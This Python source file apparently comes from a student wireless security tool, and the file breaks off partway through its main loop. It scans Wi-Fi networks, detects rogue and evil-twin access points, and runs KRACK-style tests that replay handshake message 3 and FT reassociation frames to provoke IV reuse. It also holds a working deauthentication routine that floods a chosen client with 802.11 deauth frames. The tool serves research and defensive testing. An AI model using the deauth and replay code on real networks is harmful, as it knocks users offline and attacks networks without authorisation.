#!/usr/bin/env python
# -*- coding: utf-8 -*-​
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.contrib.wpa_eapol import *
from scapy.all import *
from libwifi import *
import sys, socket, struct, time, subprocess, atexit, select
import os, time, fcntl, signal, glob, pexpect, csv 
from platform import system
from scapy.layers.dot11 import *
from threading import Timer
from subprocess import Popen, PIPE
from signal import SIGINT, signal

#colors
RED = '\033[31m'
BLUE = '\033[34m'
CYAN = '\033[36m'
YELLOW = '\033[33m'
NORMAL = '\033[0m'
HEADER = '\033[37m'

IEEE_TLV_TYPE_RSN = 48
IEEE_TLV_TYPE_FT  = 55
IEEE80211_RADIOTAP_RATE = (1 << 2)
IEEE80211_RADIOTAP_CHANNEL = (1 << 3)
IEEE80211_RADIOTAP_TX_FLAGS = (1 << 15)
IEEE80211_RADIOTAP_DATA_RETRIES = (1 << 17)

#Pre-welcome screen to check dependencies 
try:
	from scapy.all import *
except ImportError:
        logging.warning('Scapy not installed. Please install it!')
	exit(-1)


if sys.version_info[0] < 3:
	from StringIO import StringIO
else:
	from io import StringIO	

if not os.path.isdir("./scanfiles"):
		
	print "Creating New directory for scan files"
	
	os.system("mkdir ./scanfiles")

if os.geteuid() != 0:
	exit("You need to be root to run this script!")




class FT():
	def __init__(self, selectedInterface, wlanXmon, mac):
		self.detected = False
		self.c = 0
		self.nonft = 0
		mac = mac.strip()
		mac = mac.lower()		
		self.clientmac = mac
		self.nic_iface = selectedInterface
		self.nic_mon = wlanXmon
		self.sock  = None
		self.reset_client()
		log(ERROR, ("Fast Transition DETECTION STARTED "))		
		
	def reset_client(self):
		self.reassoc = None
		self.ivs = IvCollection()
		self.next_replay = None

	def start_replay(self, p):
		assert Dot11ReassoReq in p
		self.reassoc = p
		self.next_replay = time.time() + 1
		
	def procced(self):
		#### CODE REFFERENCE:https://github.com/vanhoefm/krackattacks-scripts/blob/research/krackattack/krack-ft-test.py
		p = self.sock.recv()
		if p == None: return
				
		if self.clientmac in [p.addr1, p.addr2] and Dot11WEP in p:
			
			payload = str(p[Dot11WEP])

			if payload.startswith("\xAA\xAA\x03\x00\x00\x00") and not payload.startswith("\xAA\xAA\x03\x00\x00\x00\x88\x8e"):
				log(ERROR, "ERROR: Virtual monitor interface doesn't seem to pass 802.11 encryption header to userlad.")
				log(ERROR, "   Try to disable hardware encryption, or use a 2nd interface for injection.", showtime=False)
				raw_input("\n\n\n Press Enter to continue...")
				return False
				
		if self.clientmac in [p.addr1, p.addr2] and Dot11Auth in p:
			
			self.reset_client()
			log(INFO, "Detected Authentication frame, clearing client state")
		elif p.addr2 == self.clientmac and Dot11ReassoReq in p:
			self.reset_client()
			if get_tlv_value(p, IEEE_TLV_TYPE_RSN) and get_tlv_value(p, IEEE_TLV_TYPE_FT):
				log(INFO, "Detected FT reassociation frame")
				self.start_replay(p)
			else:
				log(WARNING, "Reassociation frame does not appear to be an FT one")
				self.nonft +=1


		elif p.addr2 == self.clientmac and Dot11AssoReq in p:
			log(INFO, "Detected normal association frame")
			self.reset_client()

		elif p.addr1 == self.clientmac and Dot11WEP in p:
			iv = dot11_get_iv(p)
			
			log(INFO, "AP transmitted data using IV=%d (seq=%d)" % (iv, dot11_get_seqnum(p)))
			if self.ivs.is_iv_reused(p):
				log(WARNING, ("IV reuse detected (IV=%d, seq=%d). " +
					"AP is vulnerable!") % (iv, dot11_get_seqnum(p)), color="green")
				#TODO capture it 

				self.detected = True
			self.ivs.track_used_iv(p)
		####
	def run(self):
		
		self.sock = MitmSocket(type=ETH_P_ALL, iface=self.nic_mon)
		
		while True:

			self.procced()
				
			if self.reassoc and time.time() > self.next_replay:
				log(INFO, "Replaying Reassociation Request")
				#send(packet, iface=self.nic_mon)
				self.sock.send(self.reassoc)
				self.next_replay = time.time() + 1
				self.c +=1
			if self.detected:
					log(WARNING, ("\n\n\t\tIV reuse detected\n\n"))
					raw_input("\n\n\n Press Enter to continue...")
					return False

			if not self.detected and self.c >= 50:
					log(WARNING, ("\n\n\t\tno IV reuse detected\n\n"))
					raw_input("\n\n\n Press Enter to continue...")
					return False
			if self.nonft >= 5:

					log(WARNING, ("\n\n\t\tNo FAST TRANSITION handshake detected\n\n"))
					raw_input("\n\n\n Press Enter to continue...")
					return False

	def stop(self):
		if self.sock: self.sock.close()

def cleanupFT():
	attackFT.stop()

class AttackClient():
			
	def __init__(self,selectedInterface, wlanXmon, target_mac,bssid ):
		
		self.next_replay = None
		self.nic_targetAP = selectedInterface
		#injector needed on both channels
		self.nic_mon = wlanXmon
		self.targetAPmac = bssid.lower()
		self.targetClinetmac = target_mac.lower()
		self.sock_mon = None
		self.sock_cli = None	
		self.vuln_4way = False
		self.ivs = IvCollection()
		self.tracking = {}
		self.messageOne = None
		self.messageThree = None
		self.c = 0
		self.fields = None
		self.detected = False
		
		log(ERROR, (" DETECTION STARTED - LISTENING FOR THE HANDSHAKE"))
		log(ERROR, (" Target MAC - ACCESS POINT: " + self.targetAPmac))			
		log(ERROR, (" Target MAC - CLIENT STATION: " + self.targetClinetmac))	

		
	def decrypt(self, p):
		payload = get_ccmp_payload(p)
		llcsnap, packet = payload[:8], payload[8:]

		if payload.startswith("\xAA\xAA\x03\x00\x00\x00"):
			plaintext = payload
			plaintext = decrypt_ccmp(p, "\x00" * 16)
		return plaintext
	# Checks if IV were reused	
	def track_used_iv(self, p):
		return self.ivs.track_used_iv(p)
	# 
	def is_iv_reused(self, p):
		return self.ivs.is_iv_reused(p)
	# part of all zero key detection | logs when reinstalation detected 
	def mark_allzero_key(self, p):

		if self.vuln_4way != True:
			iv = dot11_get_iv(p)
			seq = dot11_get_seqnum(p)
			log(WARNING, ("%s: usage of all-zero key detected (IV=%d, seq=%d). " +
				"Client (re)installs an all-zero key in the 4-way handshake (this is very bad).") % (self.mac, iv, seq), color="red")
			
		self.vuln_4way = True
		
	#### NOTE This function filter wireless traffic
	#### TODO For MITM it needs working threading/multiprocessing 
	def handle_mon_rx(self):

		p = self.sock_mon.recv()
		if p == None: return
		if self.targetAPmac not in [p.addr1,p.addr2, p.addr3] or self.targetClinetmac not in [p.addr1,p.addr2, p.addr3]: return	
		
		#### CODE REFERENCE: https://www.sans.org/reading-room/whitepapers/wireless/programming-wireless-security-32813
		#### NOTE Listens for and Indentyfies 4-way handshake  
		if p.haslayer(WPA_key):
			layer = p.getlayer(WPA_key)

			# First, check that the access point is the one we want to target
			if (not p.addr3 == self.targetAPmac):
				print AP
				print "not ours\n"
				return

			if (p.FCfield & 1): 
				# Message come from STA 
				# From DS = 0, To DS = 1
				STA = p.addr2
			elif (p.FCfield & 2): 
				# Message come from AP
				# From DS = 1, To DS = 0
				STA = p.addr1
			else:
				# either ad-hoc or WDS
				return
		
			if (not self.tracking.has_key (STA)):
				self.fields = {
							'frame1': None,
							'frame2': None,
							'frame3': None,
							'frame4': None,
							'replay_counter': None,
							'packets': []
						}
				self.tracking[STA] = self.fields

			key_info = layer.key_info
			wpa_key_length = layer.wpa_key_length
			replay_counter = layer.replay_counter

			WPA_KEY_INFO_INSTALL = 64
			WPA_KEY_INFO_ACK = 128
			WPA_KEY_INFO_MIC = 256

			# check for frame 1
			if ((key_info & WPA_KEY_INFO_MIC == 0)):
				print "Found packet 1 for ", STA
				self.tracking[STA]['frame1'] = 1
				self.tracking[STA]['packets'].append (p)
				self.messageOne = p			
			
			# check for frame 2
			elif ((key_info & WPA_KEY_INFO_MIC) and 
				(key_info & WPA_KEY_INFO_ACK == 0) and 
				(key_info & WPA_KEY_INFO_INSTALL == 0) and 
				(wpa_key_length > 0)) :
				print "Found packet 2 for ", STA
				self.tracking[STA]['frame2'] = 1
				self.tracking[STA]['packets'].append (p)

			# check for frame 3
			elif ((key_info & WPA_KEY_INFO_MIC) and 
				(key_info & WPA_KEY_INFO_ACK) and 
				(key_info & WPA_KEY_INFO_INSTALL)):
				print "Found packet 3 for ", STA
				self.tracking[STA]['frame3'] = 1
				# store the replay counter for this STA
				self.tracking[STA]['replay_counter'] = replay_counter
				self.tracking[STA]['packets'].append (p)
				self.messageThree = p

			# check for frame 4
			elif ((key_info & WPA_KEY_INFO_MIC) and 
				(key_info & WPA_KEY_INFO_ACK == 0) and 
				(key_info & WPA_KEY_INFO_INSTALL == 0) and
				self.tracking[STA]['replay_counter'] == replay_counter):
				print "Found packet 4 for ", STA
				self.tracking[STA]['frame4'] = 1
				self.tracking[STA]['packets'].append (p)

			# if fullhandshake recorded
			if (self.tracking[STA]['frame1'] and self.tracking[STA]['frame2'] and self.tracking[STA]['frame3'] and self.tracking[STA]['frame4']):

				#print( RED + '''\n\n 4-way Handshake Detected''')
				log(INFO, ("\n\n\t\tHandshake Found\n\n"), color="green")

				#NOTE STORES 4-WAY to pcap			
				#wrpcap ("/root/Desktop/a.pcap", self.tracking[STA]['packets'])
				
				#FIXME Flush
				self.tracking[STA]['frame1'] = None
				self.tracking[STA]['frame2'] = None
				self.tracking[STA]['frame3'] = None
				self.tracking[STA]['frame4'] = None	

			
		####		
				
		#### CODE REFFERENCE: https://github.com/vanhoefm/krackattacks-scripts/blob/research/krackattack/krack-test-client.py
		if self.targetClinetmac == p.addr1 and Dot11WEP in p:
			if decrypt_ccmp(p, "\x00" * 16).startswith("\xAA\xAA\x03\x00\x00\x00"):
				client.mark_allzero_key(p)
			iv = dot11_get_iv(p)

			log(INFO, "AP transmitted data using IV=%d (seq=%d)" % (iv, dot11_get_seqnum(p)))
			
			if decrypt_ccmp(p, "\x00" * 16).startswith("\xAA\xAA\x03\x00\x00\x00"):
				client.mark_allzero_key(p)
				
			if self.ivs.is_iv_reused(p):
				#TODO Store reused packets to pcap
				log(INFO, ("IV reuse detected (IV=%d, seq=%d). " +
					"Client is vulnerable!") % (iv, dot11_get_seqnum(p)), color="green")

				self.detected = True

			self.track_used_iv(p)	

	def run(self):

		self.sock_ap = L2Socket(type=ETH_P_ALL, iface=self.nic_targetAP) ### socket ap interace
		self.sock_mon = MitmSocket(type=ETH_P_ALL, iface=self.nic_mon)  ### socket monitor
		####
		while True:
			self.handle_mon_rx()
						
			if self.messageThree and self.messageOne and time.time() > self.next_replay:
				
				#TODO Make option to replay sole message 3 	
				#self.sock_ap.send(self.messageOne)
				#time.sleep(0.5)
				#log(INFO, "Replaying messge 1 and 3. Number:"+ str(self.c))			
				self.sock_ap.send(self.messageThree)
				log(INFO, "Replaying messge 3. Number:" + str(self.c))				
				self.c +=1
				self.next_replay = time.time() + 2
			if self.detected:
					log(WARNING, ("\n\n\t\tIV reuse detected\n\n"))
					raw_input("\n\n\n Press Enter to continue...")
					return False

			if not self.detected and self.c >= 50:
					log(WARNING, ("\n\n\t\tno IV reuse detected\n\n"))
					raw_input("\n\n\n Press Enter to continue...")
					return False
			
	def stop(self):
		if self.sock_mon: self.sock_mon.close()
		if self.sock_ap: self.sock_ap.close()	
			
def cleanupAT():
	attackAT.stop()
######################WIRELESS TOOL 
#Global Variables 
interfaceslist = []
stationslist = []
clientslist = []
whitelist = []

def stop_ifExist():
	#cleaning lists
	interfaceslist [:] = []
	whitelist [:] = []
	#Stoping monitor if exist
	subprocess.call(["iw", wlanXmon, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
	os.system("ifconfig " + selectedInterface + " up")
	


ourlogo = CYAN + '''
	____    __    ____      .___________.  ______     ______    __      
	\   \  /  \  /   /      |           | /  __  \   /  __  \  |  |     
	 \   \/    \/   / ______`---|  |----`|  |  |  | |  |  |  | |  |     
	  \            / |______|   |  |     |  |  |  | |  |  |  | |  |     
	   \    /\    /             |  |     |  `--'  | |  `--'  | |  `----.
	    \__/  \__/ireless       |__|      \______/   \______/  |Ver1.0_| 

        '''
footer = RED + '''
       }---------------------------{+}  itb.ie project {+}---------------------------{
''' 

def welcome_screen():
	
	clear_screen()
	print (ourlogo)
	print (footer)
	
	print ( CYAN + ''' 
		************    List of available interfaces    **************** 
		************ Please use external card if possible ****************

		''' + YELLOW +   

	str(interfaces()).replace('], [','\n \t\t').replace('[[','').replace(']]','') +  NORMAL 

	)

	#please don't laugh here | list to sting in nice order
	# exception handler for input
	while True:
		raw_select = raw_input("\n \n \t Please select your interface: ".format(N=NORMAL, R=RED)).lower()
		if raw_select == "help":
		    return raw_select
		try:
		    select = int(raw_select)
		except ValueError:
		    print("{R}ERROR: ONLY NUMBERS.{N}".format(R=RED, N=NORMAL))
		    continue

		if select in range(len(interfaceslist)):
		    x = interfaceslist[select][2]	
		    return x
		else:
		    print("{R}ERROR: PLEASE SELECT AVAILABLE INTERFACE.{N}".format(R=RED, N=NORMAL))
		    continue	


def makeMonitor(selectedInterface):
	
	mon = 'mon'
	intfmon = selectedInterface + mon
	intfmon = str(intfmon)
	
	if not os.path.isdir("/sys/class/net/" + selectedInterface):
		print "WiFi interface %s does not exist! Cannot continue!" %(selectedInterface)
		exit(1)
	else:
		try:	
			if os.path.isdir("/sys/class/net/" + intfmon):
				subprocess.call(["iw", intfmon, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
				#os.system("ifconfig " + selectedInterface + "up")
				time.sleep(0.5)

			subprocess.check_output(["iw", selectedInterface, "interface", "add", intfmon, "type", "monitor"])
			subprocess.check_output(["iw", intfmon, "set", "type", "monitor"])
			time.sleep(0.5)
			subprocess.check_output(["ifconfig", intfmon, "up"])	
			
			print "Creating monitor VAP %s for parent %s..." %(intfmon,selectedInterface)
		except OSError as e:
			print "Could not create monitor %s" %intfmon
			os.kill(os.getpid(),SIGINT)
			stop_ifExist()
			main()
	

	return intfmon
	
def makeScan(intfmon):	

	if not os.path.isdir("./scanfiles"):
		
		print "Creating New directory for scan files"
		
		os.system("mkdir ./scanfiles")
	else:	
		try:		
			clear_screen()
			print( YELLOW +'''

			    ************ LOADING SCAN DATA ****************
			    
			    ************    PLEASE WAIT    **************** ''' + RED + '''

			    ************ DO NOT INTERRUPT  ****************
			    
			    '''
			)
		
			# FIXME !!!!! this needs internal scaner not airodump
			# FIXME !!!!! this needs subproccess for faster output | coudlnt get Popen to work from terminal, works wine from IDE
			# change number of seconds for better results			
			cmd_airodump = pexpect.spawn('airodump-ng '+intfmon+' --output-format csv -w ./scanfiles/scan')
			cmd_airodump.expect([pexpect.TIMEOUT, pexpect.EOF], 25)
			cmd_airodump.close()
			
		except OSError as e:
			print "Could not perfroem scan with %s device" %intfmon
			os.kill(os.getpid(),SIGINT)
			stop_ifExist()
			main()

def monitor_channel(channel,intfmon,selectedInterface):
	#try:
	subprocess.call(["iw", intfmon, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
	
	time.sleep(0.5)
	subprocess.check_output(["iw", selectedInterface, "interface", "add", intfmon, "type", "monitor"])
	subprocess.check_output(["iw", intfmon, "set", "type", "monitor"])
	time.sleep(0.5)
	subprocess.check_output(["iw", intfmon, "set", "channel", channel])
	time.sleep(0.5)
	subprocess.check_output(["ifconfig", intfmon, "up"])	
	
def maininterface_channel(channel, selectedInterface):
	#try:
	subprocess.check_output(["ifconfig", selectedInterface, "down"])	
	subprocess.check_output(["iw", selectedInterface, "set", "channel", channel])
	subprocess.check_output(["ifconfig", selectedInterface, "up"])	
	
def maininterface_reset(selectedInterface):
	#try:
	subprocess.check_output(["ifconfig", selectedInterface, "down"])	
	subprocess.check_output(["iw", selectedInterface, "interface", "add", "temp", "type", "managed"])	
	subprocess.call(["iw", selectedInterface, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
	time.sleep(0.5)
	subprocess.check_output(["iw", "temp", "interface", "add", selectedInterface, "type", "managed"])	
	subprocess.call(["iw", "temp", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
	time.sleep(0.5)
	subprocess.check_output(["ifconfig", selectedInterface, "up"])

def rescan_on_channel(channel,intfmon,selectedInterface):
		
	if os.path.isdir("/sys/class/net/" + intfmon):
		
		try:
			#puts monitor in specific channel 
			monitor_channel(channel,intfmon,selectedInterface)
			print "Creating monitor %s on channel %s..." %(intfmon,channel)
									
		except OSError as e:
			print "Could not create monitor %s" %intfmon
			os.kill(os.getpid(),SIGINT)
			stop_ifExist()
			main()
	
	if not os.path.isdir("./scanfiles"):		
		print "Creating New directory for scan files"		
		os.system("mkdir ./scanfiles")
	else:	
		try:		
			clear_screen()			
			print( HEADER +'''
			    ************ LOADING SCAN DATA ****************
			    
			    ************    PLEASE WAIT    **************** ''' + RED + '''

			    ************ DO NOT INTERRUPT  ****************			    
			    '''	)		
					
			cmd_airodump = pexpect.spawn('airodump-ng '+intfmon+' --output-format csv -w ./scanfiles/CHscan --channel '+channel)
			cmd_airodump.expect([pexpect.TIMEOUT, pexpect.EOF], 25)
			cmd_airodump.close()
			
		except OSError as e:
			print "Could not perfroem scan with %s device" %intfmon
			os.kill(os.getpid(),SIGINT)			
			stop_ifExist()
			main()
	# put monitor back in "non channel specific" mode
	makeMonitor(selectedInterface)

def rescan_with_station(station,intfmon,selectedInterface ):	
	
	bssid = stationslist[station][1]
	essid = stationslist[station][7]
	channel = stationslist[station][2]
	#puts monitor to station specific channel
	monitor_channel(channel,intfmon,selectedInterface)

	try:		
		clear_screen()
		
		print( HEADER +'''
		    ************ LOADING SCAN DATA ****************
		    
		    ************    PLEASE WAIT    **************** ''' + RED + '''

		    ************ DO NOT INTERRUPT  ****************
	     ''')	
		# FIXME !!!!! this needs internal scapy scaner not airodump
		# FIXME !!!!! this needs subproccess for faster output | coudlnt get Popen to work from the terminal, works wine from IDE
		# change number of seconds for better results			
		cmd_airodump = pexpect.spawn('airodump-ng '+intfmon+' --bssid \''+bssid+'\' --essid \''+essid+'\' --output-format csv -w ./scanfiles/Clientsscan --channel '+channel)
		cmd_airodump.expect([pexpect.TIMEOUT, pexpect.EOF], 20)
		cmd_airodump.close()		
	except OSError as e:
		print "Could not perfroem scan with %s device" %intfmon
		os.kill(os.getpid(),SIGINT)
		stop_ifExist()
		main()
	#puts monitor in "non channel specyfic"
	makeMonitor(selectedInterface)
	return bssid, essid, channel

def read_latest():
#check for the latest scan in scaning folder
	
	stations_list =[]
	clients_list = []
	# Flushing arrays	
	stationslist [:] = []
	clientslist [:] = []
	stations_list [:] = []
	clients_list [:] = []
	scans = None
	latest_scan = None	
	scans = glob('./scanfiles/*')
	latest_scan = max(scans, key=os.path.getctime)	
	#separates two lists stations and clients
	with open(latest_scan,'rb') as f:
		z = f.read()	
	parts = z.split('\r\n\r\n')	
	stations = parts[0]	
	clients = parts[1]	
	stations_str = StringIO(stations)
	clients_str  = StringIO(clients)	
	rr = csv.reader(stations_str)
	ii = list(rr)

	stations_list = [k for k in ii if k <> []]
	
	#enumerates station list, builds target selection list	
	for c, line in enumerate(stations_list):
		stationslist.append([c ,line[0],line[3],line[5],line[6],line[7],line[8],line[13]])
	
	r = csv.reader(clients_str)
	i = list(r)
	clients_list = [k for k in i if k <> []]
	
	#enumerates station list, builds target selection list	
	for c, line in enumerate(clients_list):
		clientslist.append([c ,line[0],line[2],line[3],line[6]])

def print_stations():
	clear_screen()	
	read_latest()	
	print_stations_from_list()

#NOTE CSV file not changed after removing rows for whitelist

def print_stations_from_list():

	print (CYAN +	       
	       '''	       
	       ************ STATIONS'S LIST  ****************	       
	       ''')	
	for line in stationslist:
		print (line)
	
def print_clients(bssid, essid, channel):
	
	clear_screen()
	
	read_latest()
	
	print (CYAN + 
	       
	       '''	       
	       ************    ASSOSIATED CLIENT'S LIST    *****************
	       ** For STATION: ''' +bssid + essid+ ''' at the channel ''' +channel+''' **
	       ''')
	
	for line in clientslist:
		print (line)
	

def main_menu():	
	
	global main_option
	#prints menu	
	print (        
                HEADER + ''' 
        ************ PLease choose the option from menu ****************   
        ''' + YELLOW + '''
               {1}--RESCAN
               {2}--RESCAN SPECIFIC CHANNEL
               {3}--SELECT SPECIFIC STATION + RESCAN FOR ASSOSIATED CLIENTS + DEAUTH SELECTED CLIENT
               {4}--ROUGE / ROAMING AP DETECT 
               {5}--EVIL TWIN AP DETECT  
               {6}--FAST-TRANSITION - ACCESS POINT KRACKATTACK(FT ROAMING)
               {7}--MITM / EVIL TWIN - CLIENT KRACKATTACK(FOUR-WAY)
               {0}--EXIT
            ''')
	# exception handler for input
	while True:
	    raw_option = raw_input("{N}#{R}>{N} ".format(N=NORMAL, R=RED)).lower()
	    if raw_option == "help":
		return raw_option    
	    try:
		option = int(raw_option)
	    except ValueError:
		print("{R}ERROR: Option is invalid.{N}".format(R=RED, N=NORMAL))
		continue
    
	    if option >= 0 and option <= 7:
		main_option = option
		return main_option
	    else:
		print("{R}ERROR: Option is invalid.{N}".format(R=RED, N=NORMAL))
		continue

def select_channel():

	print (HEADER + '''
            
            ************ Please enter channel number from 1 - 11 ****************
	    ************        q to quit to main menu           ****************	
        ''')
	# exception handler for input
	while True:
	    raw_option = raw_input("{N}#{R}>{N} ".format(N=NORMAL, R=RED)).lower()
	    if raw_option == "q":
		stop_ifExist()
		main()    
	    try:
		option = int(raw_option)
	    except ValueError:
		print("{R}ERROR: Option is invalid.NUMBERS FROM 1 - 11. {N}".format(R=RED, N=NORMAL))
		continue
    
	    if option >= 0 and option <= 11:
		return str(option)
	    else:
		print("{R}ERROR: Option is invalid. NUMBERS FROM 1 - 11.{N}".format(R=RED, N=NORMAL))
		continue

def select_station():

	print (HEADER + '''
        \n\n       
            ************ Please select the target station from the list ****************
	    ************            q to quit to main menu             ****************
	\n\n
        ''')
		
	# exception handler for input
	while True:
	    raw_option = raw_input("{N}#{R}>{N} ".format(N=NORMAL, R=RED)).lower()
	    if raw_option == "q":
		stop_ifExist()
		main()    
	    try:
		option = int(raw_option)
	    except ValueError:
		print("{R}ERROR: Option is invalid.{N}".format(R=RED, N=NORMAL))
		continue
    
	    if option >= 1 and option <= (len(stationslist) - 1):
		return option
	    else:
		print("{R}ERROR: Option is invalid.{N}".format(R=RED, N=NORMAL))
		continue


def select_client():

	print (HEADER + '''
        \n\n       
            ************ Please select the target client to deauth     ****************
	    ************            q to quit to main menu             ****************	
        ''') 
	if len(clientslist) <= 1: 
		print (HEADER + '''
          ************ IF not listed Please type targets MA:CA:DD:RE:SS:XX     ****************
	\n\n
        ''')
	if len(clientslist) <= 1:
		while True:		
				raw_option = raw_input("{N}#{R}>{N} ".format(N=NORMAL, R=RED)).lower()
				if raw_option == "q":
					stop_ifExist()
					main()    
				
				if raw_option.count(":")!=5:
        				print("{R}ERROR: Option is invalid.{N}".format(R=RED, N=NORMAL))
					continue
				if raw_option.count(":")==5:
        				return raw_option	
			
	else:
		while True:		
				raw_option = raw_input("{N}#{R}>{N} ".format(N=NORMAL, R=RED)).lower()
				if raw_option == "q":
					stop_ifExist()
					main()    
				try:
					option = int(raw_option)
				except ValueError:
					print("{R}ERROR: Option is invalid.{N}".format(R=RED, N=NORMAL))
					continue
				
				
				if option >= 1 and option <= (len(clientslist) - 1):
					return option
				else:
					print("{R}ERROR: Option is invalid.{N}".format(R=RED, N=NORMAL))
					continue

def print_whitelist():
	
	clear_screen()
	
	print (YELLOW + 	       
	       '''	       
	       ************    WHITELISTED ACCESS POINT'S LIST    *****************	       
	       ''')
	#TODO remove position zero from the list	
	for line in whitelist:
		print (line)	
	
def whitelist_add_another():
	
	clear_screen()	
	print_stations_from_list()			
	print(CYAN + '''
    	
    **** To CONTINUE with DETECTION please Type (n)o        	*****
		''' + RED + '''
    **** To add another client to the whitelist? Type (y)es     *****
	
    **** FOR MULTIPLE ACCESS POINT NETWORKS ONLY | LIKE ROAMING *****	
	''' + HEADER + '''		
    ****            Type q to quit for start menu 	     	*****
	\n\n
	''' 
	 )

	# exception handler for input
	while True:
	    raw_option = raw_input("{N}#{R}>{N} ".format(N=NORMAL, R=RED)).lower()
	    if raw_option == "q":
		stop_ifExist()
		main()    
	    try:
		option = raw_option
	    except ValueError:
		print("{R}ERROR: Option is invalid.{N}".format(R=RED, N=NORMAL))
		continue    
	    if option == 'n':		
		return False 		
	    if option == 'y':
		whitelist_client()
		return True
	    else:
		print("{R}ERROR: Option is invalid.{N}".format(R=RED, N=NORMAL))
		continue
	

def add_to_white_list(client):
	
	white_list = []
	white_list.append([stationslist[client][1],stationslist[client][2],stationslist[client][3],stationslist[client][4],stationslist[client][5],stationslist[client][6],stationslist[client][7]])
	
	for c, line in enumerate(white_list):
		whitelist.append([c ,line[0],line[1],line[2],line[3],line[4],line[5],line[6]])
		
	
	#FIXME alter CSV file to remove a row at internal ...but why?

	#removes entire row from the list so it doesnt show up again in listed options 
	l = stationslist.pop([client][0])

	#RE-enumerates station list, builds target selection list
	stations_list = []

	for line in stationslist:
		stations_list.append([line[1],line[2],line[3],line[4],line[5],line[6],line[7]])
	
	stationslist [:] = []	

	for c, line in enumerate(stations_list):
		stationslist.append([c ,line[0], line[1],line[2],line[3],line[4],line[5],line[6]])

def whitelist_client():		
	
	clear_screen()
	while True:			
		print_stations_from_list()		
		print (YELLOW + '''
		\n\n       
	    **********   Select your ACCESS POINT for the WHITELIST   ****************
		''' + HEADER + '''
	    ************           q to quit for start menu           ****************
		\n\n
		''')
		raw_option = raw_input("{N}#{R}>{N} ".format(N=NORMAL, R=RED)).lower()
		if raw_option == "q":			
			stop_ifExist()
			main()       
		try:
			option = int(raw_option)
		except ValueError:
			print("{R}ERROR: Option is invalid.{N}".format(R=RED, N=NORMAL))
			continue
		
		
		if option >= 1 and option <= (len(stationslist)): # -1 taken away 
				
			add_to_white_list(option)
			
			if main_option == 5:
				whitelist_add_another()
			return False
    		else:

			print("{R}ERROR: Option is invalid.{N}".format(R=RED, N=NORMAL))

			continue
def get_Target_Mac(target_client):

	if target_client <=20: #TODO change this 

		target_mac = clientslist[target_client][1]

		return target_mac

	else:
		if target_client.count(":")==5:
        		return target_client
			
	


def deauth_client(target_client,intfmon,bssid):
	
	count = 50 # The number of deauth packets you want to send
	bssid = bssid # The BSSID of the Wireless Access Point you want to target

	if target_client <=20: #TODO change this
		client = clientslist[target_client][1] # The MAC address of the Client you want to kick off the Access Point
	else:
		if target_client.count(":")==5:
        		client = target_client
			
	pkt = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=3)
	print (HEADER + '''
        \n\n\n\n\n\n\n\n        
            ************ DeAuth in Progress ****************	    
	\n\n\n\n\n\n\n\n
        ''')
	for n in range(int(count)):
		
		scapy.all.sendp(pkt, iface=intfmon,count=1, inter=.2, verbose=0)

	#TODO Make a check to find out if deauth was sucesful 	
	print("Deauthentication Finished")

########### Check evil twin AP with same SSID and MAC and different other attribute (such as: Channel, Auth, Enc, Cipher) 
def find_evil_twin():
	
	detected = True

	for linee in whitelist:

		targetEssid = linee[7]
		targetBssid = linee[1]
		
		for line in stationslist:		
			
			if line[7] == targetEssid and line[1] == targetBssid:
				
				detected = False
				print (RED + 	       
		       '''	       
		       ************    POTENTIAL EVIL TWIN AP DETECTED !!!   *****************	       
		       ''')
				print line[1],line[2],line[3],line[4],line[5],line[6],line[7]
						
	if detected: 
		print (CYAN + 	       
	       '''	       
	       ************  NOTHING DETECTED THIS TIME   *****************	       
	       ''')
	
	raw_input("\n\n\n Press Enter to continue...")

########### Check rogue AP with same ESSID and different MAC and channel
def find_rouge_ap():	
	
	detected = True
	targetEssid = whitelist[0][7]
	targetBssid = whitelist[0][1]
	targetChannel = whitelist[0][2]	

	for line in stationslist:		
		
		if line[7] == targetEssid and not line[2] == targetChannel:
			
			detected = False
			print (RED + 	       
	       '''	       
	       ************    POTENTIAL ROUGE AP DETECTED !!!   *****************	       
	       ''')
			print line[1],line[2],line[3],line[4],line[5],line[6],line[7]
		
		if line[7] == targetEssid and line[2] == targetChannel and not line[1] == targetBssid:
			detected = False
			print (CYAN + 	       
	       '''	       
	       ************    POTENTIAL ROAMING DETECTED !!!   *****************	       
	       ''')
			print line[1],line[2],line[3],line[4],line[5],line[6],line[7]

	if detected: 
		print (CYAN + 	       
	       '''	       
	       ************  NOTHING DETECTED THIS TIME   *****************	       
	       ''')
	
	raw_input("\n\n\n Press Enter to continue...")
		

#clears the screen 
def clear_screen():
    os.system('clear')
	
# function to simplify usage of some of shell commands
def cmd(cmd):
    return subprocess.Popen(
        cmd, shell=True,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT
    ).stdout.read().decode()

def OScheck():
    osversion = system()
    print "Operating System: %s" %osversion
    if osversion != 'Linux':
        print "This script only works on Linux OS! Exitting!"
        exit(1)

# CHECKS FOR AVAILABLE INTERFACES

def interfaces():

	# grab list of interfaces
	response = cmd('ifconfig')
	# parse response to array
	interfaces = []

	for line in response.splitlines():

		# removes u character
		line = line.encode('ascii', 'ignore')
		
		if 'wlan' in line:
	        # this line has our interface name in the first column
	        	interfaces.append(line.split()[0].replace(":",""))
	
	log(WARNING, "DISABLING SERVICE - NETWORK MANAGER")
	log(WARNING, "RFKILL UNBLOCK WI_FI")
	subprocess.check_output(["service","NetworkManager", "stop"])
	
	for line in interfaces:
		subprocess.check_output(["ifconfig",line, "up"])

	subprocess.check_output(["rfkill", "unblock", "wifi"])

	for c, value in enumerate(interfaces):
		interfaceslist.append(["Available interface number: ", c ,value])

	# return list
	return interfaceslist

def main():		
	global wlanXmon, selectedInterface, attackFT 
	OScheck()
	selectedInterface = welcome_screen()
	wlanXmon = makeMonitor(selectedInterface)
	#uncommment that for initial scan
	makeScan(wlanXmon)			
	while True:
		#clear_screen()
		print_stations()
		main_option = main_menu()
		if main_option == 1:
			clear_screen()
			makeScan(wlanXmon)
			continue			
		if main_option == 2:
			clear_screen()
			print_stations()
			channel = select_channel()
			rescan_on_channel(channel,wlanXmon,selectedInterface)
			continue			
		if main_option == 3:
			clear_screen()
			makeScan(wlanXmon)
			print_stations()
			station = select_station()
			bssid, essid, channel = rescan_with_station(station,wlanXmon,selectedInterface)
